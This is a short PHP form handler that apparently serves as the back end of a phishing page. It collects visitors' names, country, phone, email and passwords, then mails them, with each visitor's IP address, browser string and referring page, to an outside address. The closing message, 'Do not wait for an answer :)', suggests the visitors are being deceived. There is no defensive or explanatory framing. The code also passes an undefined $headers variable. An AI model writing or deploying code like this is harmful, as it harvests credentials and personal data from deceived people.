<?php

$fname = $_POST['fname'];
$lname = $_POST['lname'];
$country = $_POST['country'];
$tel = $_POST['tel'];
$email = $_POST['email'];
$password = $_POST['password'];

$message = $_POST['message'];

$to = "in@amaster.eu";
$subject = "From the website visitor";
$text =  " Name - $fname $lname\n Country - $country\n Phone - $tel\n Email - $email\n Password - $password\n ----------------------------------\n SendPage: " . $_SERVER['HTTP_REFERER'] . "\n Browser: " . $_SERVER['HTTP_USER_AGENT'] . "\n IP-Adresse: " . $_SERVER['REMOTE_ADDR']."\n";

$header = "Content-type: text/html; charset=utf-8\r\n";
$header .= "MIME-Version: 1.0\r\n";

$sending = mail($to, $subject, $text, $headers);

if($sending) echo "Your message has been sent. Do not wait for an answer :)";

?>